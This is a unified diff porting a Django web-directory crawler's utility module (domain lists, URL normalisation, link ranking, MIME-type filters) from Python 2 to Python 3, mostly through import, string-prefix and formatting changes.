@@ -1,35 +1,33 @@
 # -*- coding: utf-8 -*-
 from django.core.exceptions import ObjectDoesNotExist
 from django.template.defaultfilters import truncatewords
-from django.db import models
-from django.db.models import Q, Count
+from django.db.models import Count
 from django.apps import apps
 from django.db.utils import DatabaseError
-from django.template.defaultfilters import truncatechars
 from django.db import IntegrityError, connection
 from django.utils.timezone import utc
 from django.utils import timezone
-from operator import itemgetter, attrgetter
-import StringIO
+import io
 from selenium import webdriver
 from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
 from PIL import Image
 import signal
 import ujson
 from bs4 import BeautifulSoup
-from models import *
-from exceptions import InvalidLanguageException
+from .models import *
+from .exceptions import InvalidLanguageException
 from datetime import timedelta
 import os
 import requests
 import favicon
-import urlparse
-import urllib
+import urllib.parse
+import urllib.request
+import urllib.parse
+import urllib.error
 import datetime
 import time
 import re
 import ipaddr
-import whois
 from nltk.corpus import stopwords
 from unidecode import unidecode
 
@@ -74,7 +72,7 @@ top_level_domains = [
 # New TLDs (many still needed)
 '.accountant', '.academy', '.adult', '.aero', '.agency', '.apartments', '.app', '.archi', '.associates', '.audio',
 '.bar', '.bargains', '.best', '.bike', '.biz', '.black', '.blackfriday', '.blog', '.blue', '.boo', '.builders',
-'.cab', '.cafe', '.camera', '.camp', '.cancerresearch', '.cards', '.center', '.ceo', '.cheap', '.christmas', '.church', '.click', '.clothing', 
+'.cab', '.cafe', '.camera', '.camp', '.cancerresearch', '.cards', '.center', '.ceo', '.cheap', '.christmas', '.church', '.click', '.clothing',
 '.club', '.codes', '.coffee', '.college', '.coop',
 '.dance', '.date', '.dating', '.design', '.diet', '.directory', '.download',
 '.education', '.email', '.events', '.exposed',
@@ -104,25 +102,25 @@ top_level_domains = [
 ]
 
 second_level_domains = [
-'.ac.uk', '.co.uk', '.gov.uk', '.judiciary.uk', '.ltd.uk', '.me.uk', '.net.uk', '.nhs.uk', '.nic.uk', '.org.uk', '.parliament.uk', '.plc.uk', '.police.uk', '.sch.uk', # UK
-'.ac.jp', '.ad.jp', '.co.jp', '.ed.jp', '.go.jp', '.gr.jp', '.lg.jp', '.ne.jp', '.or.jp', # Japan
-'.adm.br', '.adv.br', '.am.br', '.arq.br', '.art.br', '.b.br', '.bio.br', '.blog.br', '.cim.br', '.cnt.br', '.com.br', '.coop.br', '.ecn.br', '.eng.br', '.esp.br', '.etc.br', 'eti.br', '.edu.br', '.fm.br', '.fst.br', '.g12.br', '.imb.br', '.ind.br', '.inf.br', '.lel.br', '.gov.br', '.jor.br', '.jus.br', '.mat.br', '.med.br', '.mil.br', '.mus.br', '.net.br', '.nom.br', '.ntr.br', '.org.br', '.ppg.br', '.pro.br', '.psi.br', '.rec.br', '.srv.br', '.trd.br', '.tur.br', '.tv.br', '.vet.br', '.vlog.br', '.wiki.br', # Brazil
-'.ab.ca', '.bc.ca', '.gc.ca', '.mb.ca', '.nb.ca', '.nf.ca', '.nl.ca', '.ns.ca', '.nt.ca', '.nu.ca', '.on.ca', '.pe.ca', '.qc.ca', '.sk.ca', '.yk.ca', # Canada
-'.ak.us', '.al.us', '.ar.us', '.az.us', '.ca.us', '.co.us', '.ct.us', '.dc.us', '.de.us', '.fl.us', '.ga.us', '.hi.us', '.ia.us', '.id.us', '.il.us', '.in.us', '.ks.us', '.ky.us', '.la.us', '.ma.us', '.md.us', '.me.us', '.mi.us', '.mn.us', '.mo.us', '.ms.us', '.mt.us', '.nc.us', '.nd.us', '.ne.us', '.nh.us', '.nj.us', '.nm.us', '.nv.us', '.ny.us', '.oh.us', '.ok.us', '.or.us', '.pa.us', '.ri.us', '.sc.us', '.sd.us', '.tn.us', '.tx.us', '.ut.us', '.va.us', '.vt.us', '.wa.us', '.wi.us', '.wv.us', '.wy.us', # US States
-'.asn.au', '.com.au', '.csiro.au', '.edu.au', '.gov.au', '.id.au', '.net.au', '.org.au', # Australia
-'.ac.in', '.co.in', '.edu.in', '.ernet.in', '.firm.in', '.gen.in', '.gov.in', '.ind.in', '.mil.in', '.net.in', '.nic.in', '.org.in', '.res.in', # India
-'.ac.id', '.biz.id', '.co.id', '.desa.id', '.go.id', '.mil.id', '.my.id', '.net.id', '.or.id', '.sch.id', '.web.id', # Indonesia
-'.asso.fr', '.gouv.fr', '.tm.fr', # France
-'.gov.it', # Italy
-'.com.pt', '.edu.pt', '.gov.pt', '.org.pt', '.int.pt', '.net.pt', '.nome.pt', '.org.pt', '.publ.pt', # Portugal
-'.com.es', '.edu.es', '.gob.es', '.nom.es', '.org.es', # Spain
-'.art.pl', '.bialystok.pl', '.biz.pl', '.bydgoszcz.pl', '.com.pl', '.czest.pl', '.edu.pl', '.elk.pl', '.gda.pl', '.gdansk.pl', '.gov.pl', '.gorzow.pl', '.info.pl', '.kalisz.pl', '.katowice.pl', '.konin.pl', '.krakow.pl', '.lodz.pl', '.lublin.pl', '.malopolska.pl', '.nysa.pl', '.olsztyn.pl', '.media.pl', '.mil.pl', '.net.pl', '.ngo.pl', '.org.pl', '.opole.pl', '.pila.pl', '.poznan.pl', '.radom.pl', '.rzeszow.pl', '.slupsk.pl', '.szczecin.pl', '.torun.pl', '.tychy.pl', '.warszawa.pl', '.waw.pl', '.wroc.pl', '.wroclaw.pl', '.zgora.pl', # Poland
-'.gv.at', '.ac.at', '.co.at', '.or.at', # Austria
-'.av.tr', '.bel.tr', '.biz.tr', '.com.tr', '.edu.tr', '.gen.tr', '.gov.tr', '.info.tr', '.k12.tr', '.name.tr','.net.tr', '.org.tr', '.pol.tr', '.tsk.tr', '.tv.tr', '.web.tr', # Turkey
-'.co.hu', '.info.hu', '.net.hu', '.org.hu', # Hungary
-'.com.ro', '.info.ro', '.nom.ro', '.org.ro', '.arts.ro', '.firm.ro', '.nt.ro', '.rec.ro', '.store.ro', '.tm.ro', '.www.ro', # Romania
-'.ac.be', # Belgium
-'.com.gr', '.edu.gr', '.gov.gr', '.mil.gr', '.mod.gr', '.net.gr', '.org.gr', '.sch.gr', # Greece
+'.ac.uk', '.co.uk', '.gov.uk', '.judiciary.uk', '.ltd.uk', '.me.uk', '.net.uk', '.nhs.uk', '.nic.uk', '.org.uk', '.parliament.uk', '.plc.uk', '.police.uk', '.sch.uk',  # UK
+'.ac.jp', '.ad.jp', '.co.jp', '.ed.jp', '.go.jp', '.gr.jp', '.lg.jp', '.ne.jp', '.or.jp',  # Japan
+'.adm.br', '.adv.br', '.am.br', '.arq.br', '.art.br', '.b.br', '.bio.br', '.blog.br', '.cim.br', '.cnt.br', '.com.br', '.coop.br', '.ecn.br', '.eng.br', '.esp.br', '.etc.br', 'eti.br', '.edu.br', '.fm.br', '.fst.br', '.g12.br', '.imb.br', '.ind.br', '.inf.br', '.lel.br', '.gov.br', '.jor.br', '.jus.br', '.mat.br', '.med.br', '.mil.br', '.mus.br', '.net.br', '.nom.br', '.ntr.br', '.org.br', '.ppg.br', '.pro.br', '.psi.br', '.rec.br', '.srv.br', '.trd.br', '.tur.br', '.tv.br', '.vet.br', '.vlog.br', '.wiki.br',  # Brazil
+'.ab.ca', '.bc.ca', '.gc.ca', '.mb.ca', '.nb.ca', '.nf.ca', '.nl.ca', '.ns.ca', '.nt.ca', '.nu.ca', '.on.ca', '.pe.ca', '.qc.ca', '.sk.ca', '.yk.ca',  # Canada
+'.ak.us', '.al.us', '.ar.us', '.az.us', '.ca.us', '.co.us', '.ct.us', '.dc.us', '.de.us', '.fl.us', '.ga.us', '.hi.us', '.ia.us', '.id.us', '.il.us', '.in.us', '.ks.us', '.ky.us', '.la.us', '.ma.us', '.md.us', '.me.us', '.mi.us', '.mn.us', '.mo.us', '.ms.us', '.mt.us', '.nc.us', '.nd.us', '.ne.us', '.nh.us', '.nj.us', '.nm.us', '.nv.us', '.ny.us', '.oh.us', '.ok.us', '.or.us', '.pa.us', '.ri.us', '.sc.us', '.sd.us', '.tn.us', '.tx.us', '.ut.us', '.va.us', '.vt.us', '.wa.us', '.wi.us', '.wv.us', '.wy.us',  # US States
+'.asn.au', '.com.au', '.csiro.au', '.edu.au', '.gov.au', '.id.au', '.net.au', '.org.au',  # Australia
+'.ac.in', '.co.in', '.edu.in', '.ernet.in', '.firm.in', '.gen.in', '.gov.in', '.ind.in', '.mil.in', '.net.in', '.nic.in', '.org.in', '.res.in',  # India
+'.ac.id', '.biz.id', '.co.id', '.desa.id', '.go.id', '.mil.id', '.my.id', '.net.id', '.or.id', '.sch.id', '.web.id',  # Indonesia
+'.asso.fr', '.gouv.fr', '.tm.fr',  # France
+'.gov.it',  # Italy
+'.com.pt', '.edu.pt', '.gov.pt', '.org.pt', '.int.pt', '.net.pt', '.nome.pt', '.org.pt', '.publ.pt',  # Portugal
+'.com.es', '.edu.es', '.gob.es', '.nom.es', '.org.es',  # Spain
+'.art.pl', '.bialystok.pl', '.biz.pl', '.bydgoszcz.pl', '.com.pl', '.czest.pl', '.edu.pl', '.elk.pl', '.gda.pl', '.gdansk.pl', '.gov.pl', '.gorzow.pl', '.info.pl', '.kalisz.pl', '.katowice.pl', '.konin.pl', '.krakow.pl', '.lodz.pl', '.lublin.pl', '.malopolska.pl', '.nysa.pl', '.olsztyn.pl', '.media.pl', '.mil.pl', '.net.pl', '.ngo.pl', '.org.pl', '.opole.pl', '.pila.pl', '.poznan.pl', '.radom.pl', '.rzeszow.pl', '.slupsk.pl', '.szczecin.pl', '.torun.pl', '.tychy.pl', '.warszawa.pl', '.waw.pl', '.wroc.pl', '.wroclaw.pl', '.zgora.pl',  # Poland
+'.gv.at', '.ac.at', '.co.at', '.or.at',  # Austria
+'.av.tr', '.bel.tr', '.biz.tr', '.com.tr', '.edu.tr', '.gen.tr', '.gov.tr', '.info.tr', '.k12.tr', '.name.tr', '.net.tr', '.org.tr', '.pol.tr', '.tsk.tr', '.tv.tr', '.web.tr',  # Turkey
+'.co.hu', '.info.hu', '.net.hu', '.org.hu',  # Hungary
+'.com.ro', '.info.ro', '.nom.ro', '.org.ro', '.arts.ro', '.firm.ro', '.nt.ro', '.rec.ro', '.store.ro', '.tm.ro', '.www.ro',  # Romania
+'.ac.be',  # Belgium
+'.com.gr', '.edu.gr', '.gov.gr', '.mil.gr', '.mod.gr', '.net.gr', '.org.gr', '.sch.gr',  # Greece
 '.kommune.no', '.priv.no', '.stat.no', '.dep.no', '.fhs.no', 'mil.no', # Norway
 '.com.hr', '.iz.hr', # Croatia
 '.com.mt', '.org.mt', '.net.mt', '.edu.mt', '.gov.mt', # Malta
@@ -178,7 +176,7 @@ second_level_domains = [
 '.com.ar', '.edu.ar', '.gob.ar', '.gov.ar', '.int.ar', '.mil.ar', '.net.ar', '.org.ar', '.tur.ar', # Argentina
 '.com.co', '.edu.co', '.gov.co', '.mil.co', '.net.co', '.nom.co', '.org.co', # Colombia
 '.arts.ve', '.co.ve', '.com.ve', '.edu.ve', '.gob.ve', '.gov.ve', '.info.ve', '.int.ve', '.mil.ve', '.net.ve', '.org.ve', '.radio.ve', '.tec.ve', '.web.ve', # Venezuela
-'.com.bo', '.edu.bo',  '.org.bo', # Bolivia
+'.com.bo', '.edu.bo', '.org.bo', # Bolivia
 '.ac.ni', '.co.ni', '.com.ni', '.edu.ni', '.gob.ni', '.mil.ni', '.nom.ni', '.net.ni', '.org.ni', # Nicaragua
 '.com.pe', '.edu.pe', '.gob.pe', '.mil.pe', '.net.pe', '.ngo.pe', '.nom.pe', '.org.pe', '.sld.pe', # Peru
 '.com.ec', '.edu.ec', '.fin.ec', '.gob.ec', '.gov.ec', '.info.ec', '.mil.ec', '.org.ec', # Ecuador
@@ -205,7 +203,7 @@ second_level_domains = [
 '.gov.bi', # Burundi
 '.com.gh', '.edu.gh', '.gov.gh', '.mil.gh', '.net.gh', '.org.gh', # Ghana
 '.adv.mz', '.ac.mz', '.co.mz', '.edu.mz', '.gov.mz', '.org.mz', # Mozambique
-'.co.ao', '.ed.ao', '.gv.ao', '.it.ao', # Angola 
+'.co.ao', '.ed.ao', '.gv.ao', '.it.ao', # Angola
 '.com.cm', '.gov.cm', # Cameroon
 '.gov.bf', # Burkina Faso
 '.co.bw', '.gov.bw', # Botswana
@@ -276,7 +274,7 @@ def GetPendingIndexModelFromLanguage(language):
         language = 'cs'
     try:
         model = apps.get_model('dir', 'PendingIndex_' + language)
-    except LookupError, e:
+    except LookupError:
         raise InvalidLanguageException(language)
     if model:
         return model
@@ -294,7 +292,7 @@ def GetIndexModelFromLanguage(language):
         language = 'cs'
     try:
         model = apps.get_model('dir', 'IndexTerm_' + language)
-    except LookupError, e:
+    except LookupError:
         raise InvalidLanguageException(language)
     if model:
         return model
@@ -312,7 +310,7 @@ def GetSiteInfoModelFromLanguage(language):
         language = 'cs'
     try:
         model = apps.get_model('dir', 'SiteInfo_' + language)
-    except LookupError, e:
+    except LookupError:
         raise InvalidLanguageException(language)
     if model:
         return model
@@ -330,7 +328,7 @@ def GetSearchLogModelFromLanguage(language):
         language = 'cs'
     try:
         model = apps.get_model('dir', 'SearchLog_' + language)
-    except LookupError, e:
+    except LookupError:
         raise InvalidLanguageException(language)
     if model:
         return model
@@ -348,7 +346,7 @@ def GetKeywordRankingModelFromLanguage(language):
         language = 'cs'
     try:
         model = apps.get_model('dir', 'KeywordRanking_' + language)
-    except LookupError, e:
+    except LookupError:
         raise InvalidLanguageException(language)
     if model:
         return model
@@ -366,7 +364,7 @@ def GetAutoCompleteModelFromLanguage(language):
         language = 'cs'
     try:
         model = apps.get_model('dir', 'AutoComplete_' + language)
-    except LookupError, e:
+    except LookupError:
         raise InvalidLanguageException(language)
     if model:
         return model
@@ -384,7 +382,7 @@ def GetResultClickModelFromLanguage(language):
         language = 'cs'
     try:
         model = apps.get_model('dir', 'ResultClick_' + language)
-    except LookupError, e:
+    except LookupError:
         raise InvalidLanguageException(language)
     if model:
         return model
@@ -406,7 +404,7 @@ def ReverseWWW(domain, rootonly=False):
     """
     if not domain:
         return None
-    if not domain.startswith(u'www.'):
+    if not domain.startswith('www.'):
         pieces = domain.split('.')
         if len(pieces) > 2 and rootonly:
             root = False
@@ -417,21 +415,21 @@ def ReverseWWW(domain, rootonly=False):
             if not root:
                 return None
             else:
-                return u'www.' + domain
+                return 'www.' + domain
         else:
-            return u'www.' + domain
+            return 'www.' + domain
     else:
         return domain[4:]
 
 def GetRootUrl(url, secure=False):
-    if not url.startswith(u'http:') and not url.startswith(u'https:'):
-        if url.startswith(u'//'):
-            url = u'http:' + url
-        elif  url.startswith('://'):
-            url = u'http' + url
+    if not url.startswith('http:') and not url.startswith('https:'):
+        if url.startswith('//'):
+            url = 'http:' + url
+        elif url.startswith('://'):
+            url = 'http' + url
         else:
-            url = u'http://' + url
-    parsed_uri = urlparse.urlparse( url )
+            url = 'http://' + url
+    parsed_uri = urllib.parse.urlparse(url)
     loc = parsed_uri.netloc
     loc = loc.lower()
     if loc.endswith('.'):
@@ -450,27 +448,27 @@ def MakeRealUrl(url, domain=None, secure=False):
     blocked or processed further.
     """
     if secure:
-        scheme = u'https:'
+        scheme = 'https:'
     else:
-        scheme = u'http:'
+        scheme = 'http:'
     oldurl = url
     if not IsHtmlUrl(url):
         return url
-    if url.startswith(u'//') or url.startswith('://'):
+    if url.startswith('//') or url.startswith('://'):
         # If there's a colon, remove it and process as if it wasn't there. We'll add it later.
         if url.startswith('://'):
             url = url[1:]
         url = scheme + url
-    elif url.startswith(u':'):
+    elif url.startswith(':'):
         if secure:
-            url = u'https' + url
+            url = 'https' + url
         else:
-            url = u'http' + url
-    elif url.startswith(u'/'):
+            url = 'http' + url
+    elif url.startswith('/'):
         url = scheme + domain + url
-    elif domain and not u'/' in url:
+    elif domain and '/' not in url:
         url = scheme + domain + '/' + url
-    elif not url.startswith(u'http'):
+    elif not url.startswith('http'):
         url = scheme + '//' + url
     url = NormalizeUrl(url, pre_crawl_replacement=True, secure=secure)
     return url
@@ -486,9 +484,9 @@ def IsIPAddress(url):
 
 # Like GetRootUrl, but also drops subdomains.
 def GetRootDomain(url):
-    if not url.startswith(u'http:') and not url.startswith(u'https:'):
-        url = u'http://' + url
-    parsed_uri = urlparse.urlparse( url )
+    if not url.startswith('http:') and not url.startswith('https:'):
+        url = 'http://' + url
+    parsed_uri = urllib.parse.urlparse(url)
     loc = parsed_uri.netloc
     if IsIPAddress(loc):
         return loc
@@ -521,7 +519,7 @@ def GetDomainExtension(url):
 
 def IsValidToken(word):
     word = word.lower()
-    if word == u'the' or word == u'a' or word == u'of' or word == u'is' or word == u'an' or word == u'as' or word == u'i' or word == u'it' or word == u'in' or word == u'to' or word == u'and' or word == u'.' or word == u',' or word == u':' or word == u';' or word == u'|' or word == u'et' or word == u'on' or word == u'en' or word == u'un' or word == u'e' or word == u'le' or word == u'la' or word == u'-' or word == u'è' or word == u'o' or word == u'&':
+    if word == 'the' or word == 'a' or word == 'of' or word == 'is' or word == 'an' or word == 'as' or word == 'i' or word == 'it' or word == 'in' or word == 'to' or word == 'and' or word == '.' or word == ',' or word == ':' or word == ';' or word == '|' or word == 'et' or word == 'on' or word == 'en' or word == 'un' or word == 'e' or word == 'le' or word == 'la' or word == '-' or word == 'è' or word == 'o' or word == '&':
         return False
     return True
 
@@ -533,7 +531,7 @@ def GetTerms(keywords):
     keywords = keywords.lower()
     if keywords.startswith('"') and keywords.endswith('"'):
         keywords = re.sub('"', '', keywords)
-        return [keywords,]
+        return [keywords, ]
     # TODO: Escape quote so this is a single operation.
     # Note: We were removing periods, but that breaks searches for things like 'google.com'.
     keywords = re.sub('[,;"]', '', keywords)
@@ -584,25 +582,25 @@ def GetLinkRank(domains_linking_in):
     """
     bonus = 0
     if domains_linking_in >= 1875000:
-        bonus += 10.0 + (0.000000128 * (domains_linking_in-1953125))
+        bonus += 10.0 + (0.000000128 * (domains_linking_in - 1953125))
     elif domains_linking_in >= 375000:
-        bonus += 9.0 + (0.00000064 * (domains_linking_in-390625))
+        bonus += 9.0 + (0.00000064 * (domains_linking_in - 390625))
     elif domains_linking_in >= 75000:
-        bonus += 8.0 + (0.0000032 * (domains_linking_in-78125))
+        bonus += 8.0 + (0.0000032 * (domains_linking_in - 78125))
     elif domains_linking_in >= 15000:
-        bonus += 7.0 + (0.000016 * (domains_linking_in-15625))
+        bonus += 7.0 + (0.000016 * (domains_linking_in - 15625))
     elif domains_linking_in >= 3000:
-        bonus += 6.0 + (0.00008 * (domains_linking_in-3125))
+        bonus += 6.0 + (0.00008 * (domains_linking_in - 3125))
     elif domains_linking_in >= 625:
-        bonus += 5.0 + (0.0004 * (domains_linking_in-625))
+        bonus += 5.0 + (0.0004 * (domains_linking_in - 625))
     elif domains_linking_in >= 125:
-        bonus += 4.0 + (0.002 * (domains_linking_in-125))
+        bonus += 4.0 + (0.002 * (domains_linking_in - 125))
     elif domains_linking_in >= 25:
-        bonus += 3.0 + (0.01 * (domains_linking_in-25))
+        bonus += 3.0 + (0.01 * (domains_linking_in - 25))
     elif domains_linking_in >= 5:
-        bonus += 2.0 + (0.05 * (domains_linking_in-5))
+        bonus += 2.0 + (0.05 * (domains_linking_in - 5))
     elif domains_linking_in >= 1:
-        bonus += 1.0 + (0.25 * (domains_linking_in-1))
+        bonus += 1.0 + (0.25 * (domains_linking_in - 1))
     return bonus
 
 def GetIndexModifiersForDomain(rooturl, lang=None, rulematches=None, verbose=False):
@@ -720,7 +718,7 @@ def GetIndexModifiersForDomain(rooturl, lang=None, rulematches=None, verbose=Fal
         if domain.domcop_pagerank and not domain.domcop_pagerank_outdated:
             bonus += domain.domcop_pagerank
             if verbose:
-                rulematches.append('Bonus {0} for Domcop PageRank {1}'.format(domain.domcop_pagerank))
+                rulematches.append('Bonus {0} for Domcop PageRank {0}'.format(domain.domcop_pagerank))
         if domain.domains_linking_in:
             linkrank = GetLinkRank(domain.domains_linking_in)
             if verbose:
@@ -738,7 +736,7 @@ def GetIndexModifiersForDomain(rooturl, lang=None, rulematches=None, verbose=Fal
         if len(hyphens) > 1:
             bonus -= (len(hyphens) - 1)
             if verbose:
-                rulematches.append('-{0} points for {1} hyphens'.format((len(hyphens)-1), len(hyphens)))
+                rulematches.append('-{0} points for {1} hyphens'.format((len(hyphens) - 1), len(hyphens)))
         if domain.domain_created:
             mod = GetDomainAgeModifier(domain)
             value *= mod
@@ -759,21 +757,21 @@ def IsBadMimeType(mimetype):
     """
     Is this a MIME type we don't want to save in our index?
     """
-    if mimetype in [u'application/pdf', u'image/jpeg', u'application/x-shockwave-flash', u'image/png', u'image/gif', u'application/octet-stream',
-                    u'application/x-gzip', u'application/zip', 'video/x-ms-asf', u'application/x-bittorrent', u'application/epub+zip', 
-                    u'application/x-icq', u'audio/x-pn-realaudio', u'audio/mpeg', u'audio/mid', u'image', u'application/pdf;charset=UTF-8',
-                    u'audio/midi', u'video/mp4', u'image/tiff', u'video/x-msvideo', u'audio/x-ms-wma', u'text/calendar', u'image/pjpeg',
-                    u'application/vnd.oasis.opendocument.text', u'application/x-msdownload', u'audio/x-scpls', u'text/x-c; charset=UTF-8',
-                    u'text/x-c++; charset=UTF-8', u'application/pdf; charset=utf-8', u'text/calendar; charset=UTF-8',
-                    u'audio/x-scpls; name="playlist.pls"', u'image/GIF', u'image/jpg', u'application/vnd.ms-excel;charset=utf-8',
-                    u'type: text/Calendar', u'application/vnd.openxmlformats-officedocument.presentationml.slideshow', u'application/x-ms-reader',
-                    u'"image/jpg"', u'application/msword', u'application/vnd.ms-excel', u'audio/mpegurl', u'audio/x-mp3',
-                    u'application/vnd.openxmlformats-officedocument.presentationml.presentation', u'application/postscript',
-                    u'application/vnd.symbian.install', u'application/download', u'audio/mpeg3; Charset=UTF-8', u'MIME type: audio/x-mpegurl',
-                    u'application/octet-stream, text/html; charset=UTF-8', u'application/x-pdf', u'application/pdf; charset=UTF-8',
-                    u'video/x-ms-asf; charset=utf-8', u'application/pdf;charset=utf-8', u'application/pdf;charset=ISO-8859-1',
-                    u'image/jpeg; charset=binary', u'image/jpeg;charset=UTF-8', u'image/jpeg; charset=utf-8',
-                    u'text/calendar;charset=UTF-8', u'text/calendar; charset=utf-8', u'application/calendar; charset=utf-8']:
+    if mimetype in ['application/pdf', 'image/jpeg', 'application/x-shockwave-flash', 'image/png', 'image/gif', 'application/octet-stream',
+                    'application/x-gzip', 'application/zip', 'video/x-ms-asf', 'application/x-bittorrent', 'application/epub+zip',
+                    'application/x-icq', 'audio/x-pn-realaudio', 'audio/mpeg', 'audio/mid', 'image', 'application/pdf;charset=UTF-8',
+                    'audio/midi', 'video/mp4', 'image/tiff', 'video/x-msvideo', 'audio/x-ms-wma', 'text/calendar', 'image/pjpeg',
+                    'application/vnd.oasis.opendocument.text', 'application/x-msdownload', 'audio/x-scpls', 'text/x-c; charset=UTF-8',
+                    'text/x-c++; charset=UTF-8', 'application/pdf; charset=utf-8', 'text/calendar; charset=UTF-8',
+                    'audio/x-scpls; name="playlist.pls"', 'image/GIF', 'image/jpg', 'application/vnd.ms-excel;charset=utf-8',
+                    'type: text/Calendar', 'application/vnd.openxmlformats-officedocument.presentationml.slideshow', 'application/x-ms-reader',
+                    '"image/jpg"', 'application/msword', 'application/vnd.ms-excel', 'audio/mpegurl', 'audio/x-mp3',
+                    'application/vnd.openxmlformats-officedocument.presentationml.presentation', 'application/postscript',
+                    'application/vnd.symbian.install', 'application/download', 'audio/mpeg3; Charset=UTF-8', 'MIME type: audio/x-mpegurl',
+                    'application/octet-stream, text/html; charset=UTF-8', 'application/x-pdf', 'application/pdf; charset=UTF-8',
+                    'video/x-ms-asf; charset=utf-8', 'application/pdf;charset=utf-8', 'application/pdf;charset=ISO-8859-1',
+                    'image/jpeg; charset=binary', 'image/jpeg;charset=UTF-8', 'image/jpeg; charset=utf-8',
+                    'text/calendar;charset=UTF-8', 'text/calendar; charset=utf-8', 'application/calendar; charset=utf-8']:
         return True
     return False
 
@@ -781,78 +779,78 @@ def GetMimeTypeModifier(mimetype, language='en', show_unrecognized=True):
     if not mimetype:
         return 0.0
     # Bonus point for being UTF-8.
-    if mimetype in [u'text/html; charset=UTF-8', u'text/html; charset=utf-8', u'text/html;charset=UTF-8', u'text/html;charset=utf-8',
-                    u'text/html; Charset=UTF-8', u'text/html; Charset=utf-8', u'text/html;charset=utf8', u'text/html; utf-8; charset=utf-8',
-                    u'text/html;Charset=UTF-8;charset=UTF-8', u'text/html; charset=UTF-8; encoding=UTF-8', u'text/html;; charset=UTF-8',
-                    u'text/html; charset="utf-8"', u'text/html; charset=utf8', u'text/html; utf-8; charset=utf-8', u'text/html; charset="UTF-8"',
-                    u'text/html; charset=utf-8;', u'text/html; charset: utf-8', u'text/html;;charset=UTF-8', u'text/html; charset=UTF8',
-                    u'text/html;; charset=UTF-8', u'text/html; UTF-8;charset=UTF-8', u'text/html; utf-8=;charset=UTF-8',
-                    u'text/html; charset=UTF-8;', u'text/html;charset=UTF-8, text/html; Charset=UTF-8', u'text/html;  charset=UTF-8',
-                    u'text/html; charset=UTF-8, text/html; charset=UTF-8', u'text/html;encoding=utf-8;charset=utf-8',
-                    u'text/html; Charset: utf-8;', u'text/html; charset=utf-8; charset=UTF-8', u'text/html; charset="utf8"',
-                    u'text/html;UTF-8; charset=UTF-8', u'text/html; charset=Utf-8', u'text/html; encoding=UTF8;charset=UTF-8',
-                    u'text/html;charset:utf-8', u'text/html; charset = utf-8; charset=UTF-8', u'text/html; charset:utf-8;',
-                    u'text/html; charset=utf8, text/html; charset=utf-8', u'text/html;charset=UTF-8,text/html;charset=UTF-8',
-                    u'text/html;;charset=utf-8', u'text/html; UTF-8', u'text/html; charset= utf-8', u'text/html; charset=UTF-8;charset=UTF-8',
-                    u'text/html; charset= UTF-8', u'text/html; charset: UTF-8; charset=utf-8', u'text/html; charset:UTF-8;charset=UTF-8',
-                    u'text/html;  charset=utf-8', u'text/html;charset=utf-8; Charset=utf-8', u'text/html; charset: UTF-8',
-                    u'text/html;charset=UTF8', u'text/html; Charset=UTF8', u'text/html; charset=utf-8; boundary=xYzZY',
-                    u'text/html; charset: UTF-8; charset=UTF-8', u'text/html; Charset=UTF-8;charset=UTF-8', u'text/html; encoding=utf-8;charset=UTF-8',
-                    u'text/HTML; charset=utf-8', u'text/HTML; Charset=utf-8', u'Text/html; charset=UTF-8', u'Text/Html; Charset=Utf-8',
-                    u'text/html; UTF-8; charset=UTF-8', u'TEXT/HTML; charset=UTF-8', u'text/html; Charset=utf8', u'text/html;charset=utf-8;', 
-                    u'Text/HTML; charset=utf-8', u'text/HTML; charset=UTF-8', u'text/html;Charset=UTF-8', u'text/html ; charset=UTF-8',
-                    u'text/html; Charset=windows-65001', u'text/HTML; Charset=UTF-8']:
+    if mimetype in ['text/html; charset=UTF-8', 'text/html; charset=utf-8', 'text/html;charset=UTF-8', 'text/html;charset=utf-8',
+                    'text/html; Charset=UTF-8', 'text/html; Charset=utf-8', 'text/html;charset=utf8', 'text/html; utf-8; charset=utf-8',
+                    'text/html;Charset=UTF-8;charset=UTF-8', 'text/html; charset=UTF-8; encoding=UTF-8', 'text/html;; charset=UTF-8',
+                    'text/html; charset="utf-8"', 'text/html; charset=utf8', 'text/html; utf-8; charset=utf-8', 'text/html; charset="UTF-8"',
+                    'text/html; charset=utf-8;', 'text/html; charset: utf-8', 'text/html;;charset=UTF-8', 'text/html; charset=UTF8',
+                    'text/html;; charset=UTF-8', 'text/html; UTF-8;charset=UTF-8', 'text/html; utf-8=;charset=UTF-8',
+                    'text/html; charset=UTF-8;', 'text/html;charset=UTF-8, text/html; Charset=UTF-8', 'text/html;  charset=UTF-8',
+                    'text/html; charset=UTF-8, text/html; charset=UTF-8', 'text/html;encoding=utf-8;charset=utf-8',
+                    'text/html; Charset: utf-8;', 'text/html; charset=utf-8; charset=UTF-8', 'text/html; charset="utf8"',
+                    'text/html;UTF-8; charset=UTF-8', 'text/html; charset=Utf-8', 'text/html; encoding=UTF8;charset=UTF-8',
+                    'text/html;charset:utf-8', 'text/html; charset = utf-8; charset=UTF-8', 'text/html; charset:utf-8;',
+                    'text/html; charset=utf8, text/html; charset=utf-8', 'text/html;charset=UTF-8,text/html;charset=UTF-8',
+                    'text/html;;charset=utf-8', 'text/html; UTF-8', 'text/html; charset= utf-8', 'text/html; charset=UTF-8;charset=UTF-8',
+                    'text/html; charset= UTF-8', 'text/html; charset: UTF-8; charset=utf-8', 'text/html; charset:UTF-8;charset=UTF-8',
+                    'text/html;  charset=utf-8', 'text/html;charset=utf-8; Charset=utf-8', 'text/html; charset: UTF-8',
+                    'text/html;charset=UTF8', 'text/html; Charset=UTF8', 'text/html; charset=utf-8; boundary=xYzZY',
+                    'text/html; charset: UTF-8; charset=UTF-8', 'text/html; Charset=UTF-8;charset=UTF-8', 'text/html; encoding=utf-8;charset=UTF-8',
+                    'text/HTML; charset=utf-8', 'text/HTML; Charset=utf-8', 'Text/html; charset=UTF-8', 'Text/Html; Charset=Utf-8',
+                    'text/html; UTF-8; charset=UTF-8', 'TEXT/HTML; charset=UTF-8', 'text/html; Charset=utf8', 'text/html;charset=utf-8;',
+                    'Text/HTML; charset=utf-8', 'text/HTML; charset=UTF-8', 'text/html;Charset=UTF-8', 'text/html ; charset=UTF-8',
+                    'text/html; Charset=windows-65001', 'text/HTML; Charset=UTF-8']:
         return 1.0
     # I have no idea how to treat the xhtml+xml MIME type. No effect right now.
-    elif mimetype in [u'application/xhtml+xml; charset=utf-8',]:
+    elif mimetype in ['application/xhtml+xml; charset=utf-8', ]:
         return 0.0
     # Half a point for ISO-8859-1 or unidentified HTML or UTF-7. It's not UTF-8, but at least it's HTML text likely to be readable. ASCII here too.
     # Windows-28591 is equivalent.
-    elif mimetype in [u'text/html', u'text/html;', u'text/html; charset=ISO-8859-1', u'text/html;charset=ISO-8859-1', u'text/html; charset=iso-8859-1', 
